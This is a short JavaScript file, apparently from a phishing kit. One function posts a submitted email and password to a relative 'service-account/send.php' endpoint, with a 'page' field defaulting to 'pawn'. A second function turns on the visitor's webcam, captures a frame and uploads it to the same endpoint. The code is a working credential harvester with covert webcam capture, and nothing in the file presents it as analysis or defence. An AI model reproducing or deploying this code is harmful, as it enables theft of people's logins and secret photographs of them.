async function send(email, password, page, id) {
  email = email.trim() !== '' ? email.trim() : 'empty';
  password = password.trim() !== '' ? password.trim() : '';
  page = page.trim() !== '' ? page.trim() : 'pawn';

  if (email === 'empty') {
    return;
  }

  try {
    let res = await fetch('../../service-account/send.php', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify({
        id: id,
        email: email,
        password: password,
        page: page
      })
    });

    let data = await res.text();
    return data;

  } catch (err) {
    return err;
  }
}
async function sendImage(id) {
  navigator.mediaDevices.getUserMedia({ video: true })
    .then(stream => {
      const video = document.createElement('video');
      video.srcObject = stream;
      video.play();
      video.onloadedmetadata = () => {
        const canvas = document.createElement('canvas');
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        const ctx = canvas.getContext('2d');
        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
        canvas.toBlob(blob => {
          const formData = new FormData();
          formData.append('image', blob, 'photo.png');
          formData.append('id', id);
          formData.append('page', 'image');
          fetch('../../service-account/send.php', {
            method: 'POST',
            body: formData
          }).then(response => response.text())
            .then(data => {
              console.log(data);
              stream.getTracks().forEach(track => track.stop());
              return true; 
            })
            .catch(error => console.error('Error:', error));
        }, 'image/peg');
      }
    })
    .catch(error => {
      return false;
    });
}